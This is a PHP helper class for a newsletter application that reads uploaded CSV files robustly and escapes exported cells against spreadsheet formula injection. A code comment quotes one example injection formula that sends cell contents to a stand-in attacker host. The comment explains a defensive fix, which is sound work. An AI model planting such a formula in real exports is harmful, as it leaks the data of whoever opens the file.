<?php

namespace App\Support\Newsletter;

use Illuminate\Support\Str;

/**
 * Reading and writing CSV, treating both directions as hostile.
 *
 * **Reading**, because an uploaded file is whatever somebody had on their
 * desktop: a spreadsheet exported by Excel on Windows, saved as UTF-16, with a
 * byte-order mark, semicolon delimiters and a million blank rows below the
 * data. Every one of those produces a "nothing imported" that looks like the
 * feature is broken rather than the file being unusual.
 *
 * **Writing**, because a CSV export is opened in Excel, and Excel executes a
 * cell beginning `=`. A subscriber whose company name is
 * `=HYPERLINK("http://attacker.test?"&A1)` turns an export into an attack on
 * whoever opens it — the address book leaves with the file. That is CSV
 * injection, it is the one thing the specification calls out by name, and the
 * fix is at the sink: escape when writing, never sanitise on the way in, so
 * the stored value stays what the person actually typed.
 */
class Csv
{
    /** Anything larger is refused before it is parsed. */
    public const MAX_ROWS = 50_000;

    /**
     * Read a file into headers and rows.
     *
     * @return array{headers: array<int, string>, rows: array<int, array<int, string>>, delimiter: string}
     */
    public static function read(string $path, int $limit = self::MAX_ROWS): array
    {
        $contents = file_get_contents($path);

        if ($contents === false) {
            return ['headers' => [], 'rows' => [], 'delimiter' => ','];
        }

        $contents = self::toUtf8($contents);
        $delimiter = self::sniff($contents);

        $rows = [];
        $handle = fopen('php://memory', 'r+');
        fwrite($handle, $contents);
        rewind($handle);

        while (($row = fgetcsv($handle, 0, $delimiter, '"', '\\')) !== false) {
            // fgetcsv yields [null] for a blank line, and a trailing newline
            // is normal — without this every file ends in a phantom row that
            // reports as "invalid: 1".
            if ($row === [null] || $row === [] || (count($row) === 1 && trim((string) $row[0]) === '')) {
                continue;
            }

            $rows[] = array_map(fn ($cell) => trim((string) $cell), $row);

            if (count($rows) > $limit + 1) {
                break;
            }
        }

        fclose($handle);

        $headers = array_shift($rows) ?? [];

        return ['headers' => $headers, 'rows' => $rows, 'delimiter' => $delimiter];
    }

    /**
     * The delimiter this file actually uses.
     *
     * A German or French Excel exports semicolons, because those locales use a
     * comma as the decimal separator. Assuming a comma turns every row into
     * one long cell, so the import reports every line invalid and the file
     * looks corrupt.
     */
    private static function sniff(string $contents): string
    {
        $firstLine = strtok($contents, "\n") ?: '';

        $counts = [
            ',' => substr_count($firstLine, ','),
            ';' => substr_count($firstLine, ';'),
            "\t" => substr_count($firstLine, "\t"),
        ];

        arsort($counts);
        $best = array_key_first($counts);

        return $counts[$best] > 0 ? $best : ',';
    }

    /**
     * Normalise the encoding, and drop the byte-order mark.
     *
     * A BOM is invisible and sticks to the *first header*, so `email` arrives
     * as `\u{FEFF}email` and matches nothing — the column mapping then offers
     * a field that looks correct and cannot be selected.
     */
    private static function toUtf8(string $contents): string
    {
        $encoding = mb_detect_encoding($contents, ['UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1', 'Windows-1252'], true);

        if ($encoding !== false && $encoding !== 'UTF-8') {
            $contents = mb_convert_encoding($contents, 'UTF-8', $encoding);
        }

        return preg_replace('/^\xEF\xBB\xBF/', '', $contents) ?? $contents;
    }

    /**
     * Guess which column is which, so the mapping step starts filled in.
     *
     * A best effort that the editor confirms — the point of the mapping screen
     * is that the guess is visible and correctable, not that it is always
     * right.
     *
     * @param  array<int, string>  $headers
     * @return array<string, int|null>
     */
    public static function guessMapping(array $headers): array
    {
        $normalised = array_map(
            fn ($h) => Str::of($h)->lower()->replaceMatches('/[^a-z]/', '')->value(),
            $headers,
        );

        $candidates = [
            'email' => ['email', 'emailaddress', 'mail', 'e', 'address'],
            'first_name' => ['firstname', 'first', 'fname', 'givenname', 'name'],
            'last_name' => ['lastname', 'last', 'lname', 'surname', 'familyname'],
            'company' => ['company', 'organisation', 'organization', 'business', 'firm'],
            'phone' => ['phone', 'telephone', 'mobile', 'contactnumber', 'tel'],
        ];

        $mapping = [];

        foreach ($candidates as $field => $names) {
            $mapping[$field] = null;

            foreach ($names as $name) {
                $index = array_search($name, $normalised, true);

                if ($index !== false && ! in_array($index, $mapping, true)) {
                    $mapping[$field] = $index;
                    break;
                }
            }
        }

        return $mapping;
    }

    /**
     * Make one cell safe to write into a file Excel will open.
     *
     * Prefixed with a single quote rather than stripped: the value belongs to
     * the subscriber and an export that quietly alters it is an export nobody
     * can reconcile against the console. The quote is Excel's own escape and
     * is not displayed.
     */
    public static function escape(?string $value): string
    {
        $value = (string) $value;

        // The four Excel treats as the start of a formula, plus tab and
        // carriage return, which can be used to shift a value into one.
        if ($value !== '' && str_contains("=+-@\t\r", $value[0])) {
            return "'".$value;
        }

        return $value;
    }

    /**
     * @param  array<int, string>  $headers
     * @param  iterable<array<int, string|null>>  $rows
     */
    public static function write($handle, array $headers, iterable $rows): void
    {
        // The BOM, deliberately: without it Excel on Windows reads UTF-8 as
        // the local codepage, and every accented name in the export is
        // mangled. The thing that has to be stripped on the way in is the
        // thing that has to be written on the way out.
        fwrite($handle, "\xEF\xBB\xBF");
        fputcsv($handle, $headers, ',', '"', '\\');

        foreach ($rows as $row) {
            fputcsv($handle, array_map([self::class, 'escape'], $row), ',', '"', '\\');
        }
    }
}
